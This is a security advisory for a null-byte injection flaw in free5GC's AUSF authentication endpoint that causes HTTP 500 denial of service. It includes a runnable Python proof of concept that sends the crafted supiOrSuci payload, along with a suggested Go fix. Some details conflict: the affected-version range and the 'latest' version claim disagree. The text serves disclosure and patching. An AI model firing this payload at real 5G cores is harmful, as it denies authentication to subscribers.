# [M] free5GC AUSF: null byte injection in supiOrSuci causes HTTP 500 internal service failure

## Summary
Severity: Medium
Advisory: GHSA-qj55-47fp-p62j
CVE: CVE-2026-53551
CWE: CWE-20
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-07-31
Source: https://github.com/advisories/GHSA-qj55-47fp-p62j
Type: github-advisory

## Affected
- Go: `github.com/free5gc/free5gc` — affected >=0 <4.2.2
- Go: `github.com/free5gc/ausf` — affected >=0 <1.4.5

## Details
### Summary

The free5GC AUSF (Authentication Server Function) does not validate the `supiOrSuci` field in UE authentication requests. Null bytes (`\x00`) and other control characters pass through JSON parsing unchanged and are forwarded to the UDM in an unescaped URL path. This causes Go's `net/url.Parse()` to fail, returning HTTP 500 "System failure" and leaking internal stack traces. An unauthenticated attacker can trigger this at scale—4.1% of `special_chars` mutations produce HTTP 500—causing denial of service for all subscribers attempting authentication through the affected AUSF. CWE-20 (Improper Input Validation).

---

### Details

The vulnerability lies in the AUSF's `POST /nausf-auth/v1/ue-authentications` handler. The JSON body includes a `supiOrSuci` field:

```json
{"supiOrSuci": "imsi-208930000000031", "servingNetworkName": "...", "authType": "5G_AKA"}
```

The AUSF parses this JSON (Go's `encoding/json` accepts null bytes in strings per RFC 8259), then constructs a UDM URL by directly embedding the raw `supiOrSuci` value:

```
GET /nudm-ueau/v1/{supiOrSuci}/security-information/...
```

When `supiOrSuci` contains null bytes (`\x00`), the resulting URL is illegal under RFC 3986. Go's `net/url.Parse()` fails, and the error propagates as an unhandled internal error, returning HTTP 500 with a stack trace in the response body:

```
{"error":{"status":"INTERNAL_SERVER_ERROR","message":"System failure"}}
```

The AUSF container log shows: `net/url: invalid control character in URL`.

**Attack chain:**
```
1. Attacker → AUSF: POST {"supiOrSuci": "imsi-\x00...", ...}
2. AUSF: JSON parsed OK (null bytes valid in JSON strings)
3. AUSF → UDM: GET /nudm-ueau/v1/imsi-\x00.../security-information/...
4. UDM: net/url.Parse() fails (\x00 illegal per RFC 3986)
5. AUSF ← UDM: error
6. Attacker ← AUSF: HTTP 500 {"message": "System failure"}
```

**Contrast with C/C++ 5GCs:** The same null-byte injection in string fields causes SIGSEGV/SIGABRT in OAI (C++) and Open5GS (C), but "only" HTTP 500 in free5GC (Go). Go's memory safety converts the crash into a recoverable error—the service survives, but the denial is equally effective.

**Discovery context:** Found via automated 5G SBI fuzzing. The `special_chars` mutation strategy injected 10 consecutive null bytes into string-valued JSON fields. Across 24h of fuzzing:

| Strategy | Requests | HTTP 500s | Trigger Rate |
|----------|----------|-----------|-------------|
| `special_chars` | 98,304 | 4,021 | 4.1% |
| `seed_replay` | 132,428 | 7,947 | 6.0% |
| `grammar_aware` | 30,944 | 683 | 2.2% |

100% of HTTP 500s originated from the `POST /nausf-auth/v1/ue-authentications` endpoint.

### PoC

**No configuration changes needed.** Default free5GC deployment is vulnerable.

```python
#!/usr/bin/env python3
import http.client, json

AUSF_HOST = "127.0.0.1"   # Replace with AUSF IP (e.g. 172.24.0.50)
AUSF_PORT = 8000

# Bug: null bytes in supiOrSuci → HTTP 500
body_bug = json.dumps({
    "supiOrSuci": "imsi-\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
    "servingNetworkName": "5G:mnc093.mcc208.3gppnetwork.org",
    "authType": "5G_AKA"
})

conn = http.client.HTTPConnection(AUSF_HOST, AUSF_PORT, timeout=5)
conn.request("POST", "/nausf-auth/v1/ue-authentications",
             body=body_bug, headers={"Content-Type": "application/json"})
resp = conn.getresponse()
print(f"Bug:    Status {resp.status}")   # Returns 500

# Contrast: normal SUCI → 404 (expected, UE not found)
body_normal = json.dumps({
    "supiOrSuci": "imsi-208930000000031",
    "servingNetworkName": "5G:mnc093.mcc208.3gppnetwork.org",
    "authType": "5G_AKA"
})

conn2 = http.client.HTTPConnection(AUSF_HOST, AUSF_PORT, timeout=5)
conn2.request("POST", "/nausf-auth/v1/ue-authentications",
              body=body_normal, headers={"Content-Type": "application/json"})
resp2 = conn2.getresponse()
print(f"Normal: Status {resp2.status}")  # Returns 404
```

**Run:** `python3 reproduce.py`

**Expected fix (input validation + URL escaping):**
```go
import "regexp"
import "net/url"

var suciRegex = regexp.MustCompile(`^[a-zA-Z0-9\-]+$`)

func validateSUCI(supiOrSuci string) error {
    if strings.ContainsFunc(supiOrSuci, func(r rune) bool {
        return r < 0x20 || r > 0x7e
    }) {
        return fmt.Errorf("SUCI contains illegal characters")
    }
    return nil
}

// URL-escape before constructing UDM request
udmURL := fmt.Sprintf("http://%s/nudm-ueau/v1/%s/security-information/...",
    udmAddr, url.PathEscape(supiOrSuci))
```

### Impact

| Property | Value |
|----------|-------|
| **Authentication** | None required (unauthenticated SBI endpoint) |
| **Impact** | Denial of Service — AUSF returns HTTP 500 for all authentication requests during attack |
| **Information Leak** | HTTP 500 response leaks internal `net/url.Parse` error, enabling backend fingerprinting |
| **Affected version** | free5GC v4.2.2 (latest) |
| **Fix** | Validate `supiOrSuci` before URL construction; use `url.PathEscape()` |


**Environment:** Ubuntu 22.04, kernel 6.8.0-110, free5GC Docker containers on bridge network 172.24.0.0/16. NFs deployed: NRF, UDM, UDR, AUSF, AMF, SMF, PCF, NSSF, MongoDB.

## References
- https://github.com/free5gc/free5gc/security/advisories/GHSA-qj55-47fp-p62j
- https://github.com/free5gc/free5gc/issues/1048
- https://github.com/free5gc/ausf/pull/61
- https://github.com/free5gc/ausf/commit/bfc4a10094dbacbd862baa4686829f3fcc06ce1e
- https://github.com/free5gc/ausf/releases/tag/v1.4.5
- https://github.com/free5gc/free5gc
- https://github.com/free5gc/free5gc/releases/tag/v4.2.2
